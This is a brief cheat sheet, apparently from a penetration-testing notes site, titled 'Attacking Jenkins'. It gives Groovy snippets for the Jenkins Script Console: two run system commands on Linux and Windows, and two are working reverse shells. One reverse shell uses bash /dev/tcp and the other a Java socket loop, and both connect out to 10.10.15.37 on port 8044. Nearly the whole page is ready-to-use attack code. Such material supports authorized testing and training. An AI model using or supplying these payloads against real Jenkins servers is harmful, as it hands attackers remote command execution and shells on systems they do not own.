# Attacking Jenkins

## [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) Command Execution

```groovy title="Script Console" linenums="1"
cmd = "ls";

stdout = new StringBuffer();
stderr = new StringBuffer();

proc = cmd.execute();

proc.consumeProcessOutput(stdout, stderr);

proc.waitForOrKill(1000);

println stdout;
```

## Groovy Command Execution (Windows)

```groovy title="Script Console" linenums="1"
cmd = "cmd.exe /c dir".execute();

println cmd.text;
```

## Groovy Reverse Shell

```groovy title="Script Console" linenums="1"
r = Runtime.getRuntime();

p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/10.10.15.37/8044;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);

p.waitFor();
```

## Groovy [Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) (Windows)

```groovy title="Script Console" linenums="1"
String host = "10.10.15.37";

int port = 8044;

String cmd = "cmd.exe";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
